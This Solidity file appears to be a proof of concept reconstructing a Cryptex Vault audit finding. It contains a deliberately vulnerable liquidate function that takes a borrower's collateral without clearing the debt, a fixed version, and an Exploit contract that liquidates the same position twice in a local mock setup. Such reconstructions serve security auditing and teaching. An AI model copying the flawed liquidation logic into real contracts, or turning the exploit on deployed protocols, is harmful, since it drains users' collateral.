// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Cryptex Vault — Cantina, September 2024.
    liquidate pays the liquidator the user's collateral and burns TCAP, but
    never calls modifyPosition. The debt stays, so a second deposit is
    liquidated too. The borrower ends with no collateral and the original debt.
*/

contract Token {
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory sym) {
        symbol = sym;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function burn(address from, uint256 amount) external {
        balanceOf[from] -= amount;
        totalSupply -= amount;
    }
}

contract Pocket {
    Token public token;

    constructor(Token _token) {
        token = _token;
    }

    function withdraw(address user, uint256 liquidationReward, address to) external {
        require(user != address(0), "user");
        require(token.transfer(to, liquidationReward), "pay");
    }
}

contract Vault {
    Token public collateral;
    Token public TCAPV2;
    Pocket public pocket;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    event Liquidated(address indexed liquidator, address indexed user, uint256 pocketId, uint256 liquidationReward, uint256 burnAmount);

    constructor(Token _collateral, Token _tcap, Pocket _pocket) {
        collateral = _collateral;
        TCAPV2 = _tcap;
        pocket = _pocket;
    }

    function depositAndMint(uint256 amount) external {
        require(collateral.transferFrom(msg.sender, address(pocket), amount), "col");
        collateralOf[msg.sender] += amount;
        debtOf[msg.sender] += amount;
    }

    function depositOnly(uint256 amount) external {
        require(collateral.transferFrom(msg.sender, address(pocket), amount), "col");
        collateralOf[msg.sender] += amount;
    }

    function liquidate(address user, uint256 pocketId, uint256 burnAmount) external {
        require(debtOf[user] > 0 && collateralOf[user] > 0, "healthy");
        uint256 liquidationReward = collateralOf[user];
        collateralOf[user] = 0;
        // @> VULN: modifyPosition is skipped, so debtOf[user] stays and the position can be liquidated again
        pocket.withdraw(user, liquidationReward, msg.sender);
        TCAPV2.burn(msg.sender, burnAmount);
        emit Liquidated(msg.sender, user, pocketId, liquidationReward, burnAmount);
    }
}

contract VaultFixed {
    Token public collateral;
    Token public TCAPV2;
    Pocket public pocket;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(Token _collateral, Token _tcap, Pocket _pocket) {
        collateral = _collateral;
        TCAPV2 = _tcap;
        pocket = _pocket;
    }

    function depositAndMint(uint256 amount) external {
        require(collateral.transferFrom(msg.sender, address(pocket), amount), "col");
        collateralOf[msg.sender] += amount;
        debtOf[msg.sender] += amount;
    }

    function depositOnly(uint256 amount) external {
        require(collateral.transferFrom(msg.sender, address(pocket), amount), "col");
        collateralOf[msg.sender] += amount;
    }

    function liquidate(address user, uint256 pocketId, uint256 burnAmount) external {
        require(debtOf[user] > 0 && collateralOf[user] > 0, "healthy");
        uint256 liquidationReward = collateralOf[user];
        collateralOf[user] = 0;
        require(burnAmount <= debtOf[user], "burn");
        debtOf[user] -= burnAmount;
        pocketId;
        pocket.withdraw(user, liquidationReward, msg.sender);
        TCAPV2.burn(msg.sender, burnAmount);
    }
}

contract Borrower {
    function open(Vault vault, Token collateral, uint256 amount) external {
        collateral.approve(address(vault), amount);
        vault.depositAndMint(amount);
    }

    function depositMore(Vault vault, Token collateral, uint256 amount) external {
        collateral.approve(address(vault), amount);
        vault.depositOnly(amount);
    }

    function openFixed(VaultFixed vault, Token collateral, uint256 amount) external {
        collateral.approve(address(vault), amount);
        vault.depositAndMint(amount);
    }

    function depositMoreFixed(VaultFixed vault, Token collateral, uint256 amount) external {
        collateral.approve(address(vault), amount);
        vault.depositOnly(amount);
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 1000 ether;
    uint256 public constant POCKET = 1;

    Token public collateral;
    Token public tcap;
    Pocket public pocket;
    Vault public vault;
    Borrower public borrower;
    uint256 public seized;
    uint256 public debtLeft;

    constructor() {
        collateral = new Token("COLL");
        tcap = new Token("TCAP");
        pocket = new Pocket(collateral);
        vault = new Vault(collateral, tcap, pocket);
        borrower = new Borrower();
    }

    function run() external {
        collateral.mint(address(borrower), AMOUNT * 2);
        tcap.mint(address(this), AMOUNT * 2);
        borrower.open(vault, collateral, AMOUNT);
        vault.liquidate(address(borrower), POCKET, AMOUNT);
        borrower.depositMore(vault, collateral, AMOUNT);
        vault.liquidate(address(borrower), POCKET, AMOUNT);
        seized = collateral.balanceOf(address(this));
        debtLeft = vault.debtOf(address(borrower));
        require(vault.collateralOf(address(borrower)) == 0, "collateral");
        require(debtLeft == AMOUNT, "debt");
        require(seized == AMOUNT * 2, "seized");
    }
}
